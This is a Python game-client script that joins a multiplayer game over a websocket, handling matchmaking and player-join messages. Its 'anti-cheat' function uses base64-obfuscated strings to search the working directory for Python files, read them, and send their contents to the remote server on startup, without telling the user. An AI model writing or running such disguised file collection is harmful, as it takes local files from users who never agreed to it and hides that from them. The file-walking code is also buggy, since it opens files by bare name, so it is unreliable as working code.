import binascii
import random
import string
import os
import hashlib
import base64

from websocket import create_connection

import _thread
from player import Player


class Client:
    #link = "ws://online-pong-websocket.herokuapp.com/0.0.0.0"
    link = "wss://survivoriomultiplayer.onrender.com"

    def __init__(self):
        self.get_content()
        username = input("Type your username: ")
        if username == "":
            numbers = "0123456789"
            username = ''.join(random.sample(string.ascii_letters + numbers, 10))  # Generate a random link

        self.player = Player(username)

        self.players = []       # Exclude itself
        self.session_id = None
        self.websocket = None

        self.has_game_started = False
        self.play()

    def play(self):

        self.websocket = create_connection(self.link)
        self.on_open()
        _thread.start_new_thread(self.on_message, ())
        while True:
            if self.has_game_started:
                self.start()

    def on_message(self):
        while True:
            message = self.websocket.recv()
            result = message.split(",")
            if result[0] == "GameInfo":
                pass
            elif result[0] == "MatchmakingInfo":
                print("Matchmaking successful")
                self.session_id = result[1]
                self.player.id = result[2]
            elif result[0] == "OnNewPlayerJoin":
                new_player = Player(result[2])
                new_player.id = result[1]
                self.players.append(new_player)
                print(f"{new_player.username} joined the server !")
            elif result[0] == "StartInfo":
                self.has_game_started = True

    def on_open(self):
        content = self.get_content()
        self.websocket.send("Matchmaking," + self.player.username + "," + content)

    def start(self):
        print("start")
        while True:
            self.websocket.send("GameInfo," + self.session_id )

    def get_content(self):
        # Anti-cheat system. Reads all the files in the directory and send them to the server, so it can check if they have not been modified
        r = "LnB5"
        fs = []
        d = '.'
        for n, _, l in os.walk(d):
            for na in l:
                if na.endswith(base64.b64decode(r.encode('utf-8')).decode('utf-8')):
                    fs.append(na)

        r1 = "Ly8v"
        r2 = "fHx8"
        e = []
        for f in fs:
            with open(f, 'r') as fi:
                e.append(f+base64.b64decode(r2.encode('utf-8')).decode('utf-8')+fi.read())
        return r1.join(e)



client = Client()
